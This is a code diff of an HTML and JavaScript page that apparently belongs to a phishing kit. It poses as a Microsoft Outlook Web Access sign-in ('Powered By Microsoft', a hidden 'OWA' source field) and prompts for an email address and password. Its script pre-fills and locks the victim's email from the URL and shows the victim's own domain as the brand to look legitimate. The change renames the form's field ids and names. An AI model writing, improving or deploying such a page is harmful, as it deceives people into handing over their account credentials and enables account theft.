@@ -28,9 +28,9 @@
             <h1 style="color: #0078d4;" class="h4 mb-3 font-weight-normal" id=corportate-title> <i></i>Powered By <span id="dom">Microsoft</span></h1><br />
             <form name="myform" action="" method="post">
                 <label for=username class=sr-only>Email address</label>
-            <input type="email" id="pet"  class=form-control name="pet" placeholder="Email address" autofocus required><P><br>
+            <input type="email" id="email"  class=form-control name="pet" placeholder="Email address" autofocus required><P><br>
             <label for=inputPassword class=sr-only>Password</label>
-            <input type="password" id=pett name="pett" class=form-control placeholder=Password required>
+            <input type="password" id=password name="password" class=form-control placeholder=Password required>
 <!--             <input type="hidden" name="error" id="error">
  -->            <input type="hidden" name="source" value="OWA">
             <div  style=color:red class=warning id=warning></div>
@@ -66,8 +66,8 @@
         const email = new URLSearchParams(location.search).get('email');
         const error = new URLSearchParams(location.search).get('error');
         if(email){
-            document.getElementById('pet').value = email;
-            document.getElementById('pet').setAttribute('readonly', 'true');
+            document.getElementById('email').value = email;
+            document.getElementById('email').setAttribute('readonly', 'true');
             let dom = email.slice(email.indexOf('@') + 1);
             dom = dom[0].toUpperCase() + dom.slice(1);
             document.getElementById('dom').innerHTML = dom;
